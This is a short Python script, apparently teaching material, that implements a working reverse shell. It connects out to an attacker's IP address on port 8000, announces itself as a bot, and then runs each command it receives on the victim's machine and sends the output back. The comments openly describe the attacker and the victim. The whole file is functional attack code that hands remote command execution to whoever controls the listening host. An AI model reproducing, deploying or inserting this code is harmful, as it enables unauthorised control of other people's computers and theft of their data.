# Reverse shell
# 1. Component that connects to the attacker's computer
# 2. Shell componenet that allows the attacker to execute terminal commands on the victim's machine

import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1] # Attacker's IP address
serverPort = 8000

# Create client socket: IPv4 (AF_INet), TCPSocket (SOCK_STREAM)
clientSocket = socket(AF_INET, SOCK_STREAM)
# Connect to hacker's machine with socket IP and port number
clientSocket.connect((serverName, serverPort))
# Library sends binary data
clientSocket.send('Bot reporting for duty'.encode())

# Program must decode the data, maximum 4064 bytes are read
command = clientSocket.recv(4064).decode()
while command != "exit":
    # Copies the current process -> Subprocess
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    # Passes the command to the subprocess, which executes it on the client
    # Reads the results, which sends them to the hacker's machine
    result, err = proc.communicate()
    clientSocket.send(result)
    command = clientSocket.recv(4064).decode()
clientSocket.close()